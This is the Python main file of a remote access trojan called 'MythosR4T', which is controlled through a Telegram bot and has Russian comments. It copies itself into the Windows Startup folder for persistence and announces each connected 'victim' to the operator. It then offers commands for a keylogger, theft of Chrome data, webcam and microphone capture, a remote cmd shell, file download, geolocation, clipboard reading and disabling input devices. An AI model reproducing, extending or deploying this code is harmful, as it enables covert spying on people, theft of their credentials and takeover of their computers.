# Author        : myth-dev
# GitHub        : https://github.com/mython-dev/
# Instagram     : @thehackerworld_ && @ myth.dev_
# Telegram      : @myth_dev
# Date          : 06.30.2023
# Main Language : Python
# Version Rat   : MythosR4T 1.0

from aiogram import Bot, Dispatcher, types, executor
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from libs.config import TOKEN, ID
import sys
import os

from libs.commands import *

from logs.chrome import chrome_commmand

Thisfile = sys.argv[0] # Полный путь к файлу, включая название и расширение
Thisfile_name = os.path.basename(Thisfile) # Название файла без пути
user_path = os.path.expanduser('~') # Путь к папке пользователя


if not os.path.exists(f"{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{Thisfile_name}"):
        os.system(f'copy "{Thisfile}" "{user_path}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"')

bot = Bot(token=TOKEN)
dp = Dispatcher(bot)

help_text = """Что можете выполнить в жертве ПК:\n
/help - Отправка всех доступных комманд.
/reboot - Перезагрузить клиентский ПК.
/shutdown - Выключить клиентский ПК.
/drivers - Все драйвера ПК.
/kill - Убить системную задачу.
/sysinfo - Основная информация о системе.
/tasklist - Все системные задачи.
/monitors - Получить список мониторов.
/turnoff_mon - Выключить монитор.
/turnon_mon - Включить монитор.
/volumeup - Увеличить громкость до 100%.
/volumedown - Уменьшить громкость до 0%.
/sendmessage - Отправить сообщение с текстом.
/setwallpaper - Изменить обой.
/open_link - Открыть ссылку в браузере.
/pwd - Получить текущий рабочий каталог.
/cd - Изменить каталог.
/dir - Получить все файлы текущего каталога.
/makedir - Создать директорию.
/rmdir - Удалить директорию.
/rmfile - Удалить файл.
/searchfile - Искать файл в системе.
/screenshot- Скриншот.
/chrome - Все данные Хрома.
/webcam_snap - Сделать фото с веб-камеры.
/shell - Cmd.exe
/download - Cкачать файл.
/geolocate - Получить примерное местонахождение жертвы.
/keylogger_start - Запустить Keylogger.
/send_logs_keylogger - Отправить логи кейлоггера.
/keylogger_stop - Остановить Keylogger.
/audio - Запись аудио с пк жертвы.
/disablekeyboard - Отключить клавиатуру.
/enablekeyboard - Включить клавиатуру, Работает багом иногда не включает клавитуру...
/disablemouse - Отключить мышку.
/enablemouse - Включить мышку.
/clipboard - Посмотреть буфер обмена.
/alt_f4 - Закрыть окно.
/runprogramm - Запустить программу.
/voice - Если ты скинешь мне голосовое сообщение я открою его у жертвы
"""

async def on_startup(_):
    keyboard = InlineKeyboardMarkup()
    next_ = InlineKeyboardButton(text='Продолжить.', callback_data='next')
    keyboard.add(next_)
    await bot.send_message(chat_id=ID, text='Жертва подключилась...', reply_markup=keyboard)

@dp.message_handler(commands=['start'])
async def start_commands(message: types.Message):
    if message.from_user.id == int(ID):
        await bot.send_message(chat_id=ID, text='Нажми на /help')
    else: 
        await bot.send_message(message.chat.id, 'Вы не явлейтесь админом!!!')


@dp.message_handler(commands=['help'])
async def command_help(message: types.Message):
    if message.from_user.id == int(ID):
        await bot.send_message(chat_id=ID, text=help_text)
    else: 
        await bot.send_message(message.chat.id, 'Вы не явлейтесь админом!!!')

@dp.callback_query_handler(lambda c: c.data == 'next')
async def all_commands(message: types.Message):
    await bot.send_message(chat_id=ID, text=help_text)

    @dp.message_handler(commands=['reboot'])
    async def reboot_handler(message: types.Message):
        await reboot_command(message)

    @dp.message_handler(commands=['shutdown'])
    async def shutdown_handler(message: types.Message):
        await shutdown_command(message)

    @dp.message_handler(commands=['drivers'])
    async def drivers_handler(message: types.Message):
        await driver_command(message)

    @dp.message_handler(commands=['kill'])
    async def kill_handler(message: types.Message):
        await kill_command(message)

    @dp.message_handler(commands=['sysinfo'])
    async def sysinfo_handler(message: types.Message):
        await sysinfo_command(message)

    @dp.message_handler(commands=['tasklist'])
    async def tasklist_handler(message: types.Message):
        await tasklist_command(message)

    @dp.message_handler(commands=['monitors'])
    async def monitors_handler(message: types.Message):
        await send_list_monitor(message)

    @dp.message_handler(commands=['turnoff_mon'])
    async def turnoff_mon_handler(message: types.Message):
        await turnoffmon_command(message)

    @dp.message_handler(commands=['turnon_mon'])
    async def turnon_mon_handler(message: types.Message):
        await turnonmon_command(message)

    @dp.message_handler(commands=['volumeup'])
    async def volumeup_handler(message: types.Message):
        await volumeup_command(message)

    @dp.message_handler(commands=['volumedown'])
    async def volumedown_handler(message: types.Message):
        await volumedown_command(message)

    @dp.message_handler(commands=['sendmessage'])
    async def sendmessage_handler(message: types.Message):
        await sendmessage_command(message)

    @dp.message_handler(commands=['setwallpaper'])
    async def setwallpaper_handler(message: types.Message):
        await setwallpaper_command(message)

    @dp.message_handler(commands=['open_link'])
    async def open_link_handler(message: types.Message):
        await open_link_command(message)

    @dp.message_handler(commands=['pwd'])
    async def pwd_handler(message: types.Message):
        await pwd_command(message)

    @dp.message_handler(commands=['cd'])
    async def cd_handler(message: types.Message):
        await cd_command(message)

    @dp.message_handler(commands=['dir'])
    async def dir_handler(message: types.Message):
        await dir_command(message)

    @dp.message_handler(commands=['makedir'])
    async def makedir(message: types.Message):
        await makedir_command(message) 

    @dp.message_handler(commands=['rmdir'])
    async def rmdir(message: types.Message):
        await rmdir_command(message)

    @dp.message_handler(commands=['rmfile'])
    async def rmfile(message: types.Message):
        await rmfile_command(message)

    @dp.message_handler(commands=['searchfile'])
    async def searchfile(message: types.Message):
        await searchfile_command(message)     

    @dp.message_handler(commands=['screenshot'])
    async def screenshot(message: types.Message):
        await screenshot_command(message)     

    @dp.message_handler(commands=['webcam_snap'])
    async def webcam_snap_handler(message: types.Message):
        await webcam_snap_command(message)

    @dp.message_handler(commands=['shell'])
    async def shell_handler(message: types.Message):
        await shell(message)

    @dp.message_handler(commands=['download'])
    async def download(message: types.Message):
        await download_file(message)  

    @dp.message_handler(commands=['geolocate'])
    async def geolocate(message: types.Message):
        await geolocate_command(message) 

    @dp.message_handler(commands=['audio'])
    async def audio_handler(message: types.Message):
        await audio_command(message)

    @dp.message_handler(commands=['disablekeyboard'])
    async def disablekeyboard_handler(message: types.Message):
        await disablekeyboard_command(message)

    @dp.message_handler(commands=['enablekeyboard'])
    async def enablekeyboard_handler(message: types.Message):
        await enablekeyboard_command(message)

    @dp.message_handler(commands=['disablemouse'])
    async def disablemouse_handler(message: types.Message):
        await disablemouse_command(message)

    @dp.message_handler(commands=['enablemouse'])
    async def enablemouse_handler(message: types.Message):
        await enablemouse_command(message)

    @dp.message_handler(commands=['clipboard'])
    async def clipboard(message: types.Message):
        await clipboard_command(message)

    @dp.message_handler(commands=['alt_f4'])
    async def alt_f4(message: types.Message):
        await f4(message)   

    @dp.message_handler(commands=['runprogramm'])
    async def runprogramm_handler(message: types.Message):
        await runprogramm_command(message) 

    @dp.message_handler(commands=['chrome'])
    async def chrome_handler(message: types.Message):
        await chrome_commmand(message)

    @dp.message_handler(commands=['keylogger_start'])
    async def keylogger_start_handler(message: types.Message):
        await start_keylogger(message)
    
    @dp.message_handler(commands=['keylogger_stop'])
    async def keylogger_stop_handler(message: types.Message):
        await stop_keylogger(message)  

    @dp.message_handler(commands=['send_logs_keylogger'])
    async def send_logs_keylogger_handler(message: types.Message):
        await send_logs(message)      

    @dp.message_handler(content_types=['voice'])
    async def audio(message: types.Message):
        try:
            await bot.send_message(chat_id=ID, text='Пожалуйста, не отправляйте аудио длиннее 60 секунд.')
            await bot.send_message(chat_id=ID, text="Сейчас запущу...")
            file_id = message.voice.file_id
            file = await bot.get_file(file_id)
            file_path = file.file_path
            await bot.download_file(file_path, message.voice.file_unique_id + '.ogg')
            os.system(message.voice.file_unique_id + '.ogg')
            await bot.send_message(chat_id=ID, text='Успешно запустил твоё голосовое сообщение ✅')
            import time
            time.sleep(60)
            os.remove(message.voice.file_unique_id + '.ogg')
        except Exception as e:
            await bot.send_message(ID, e)

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)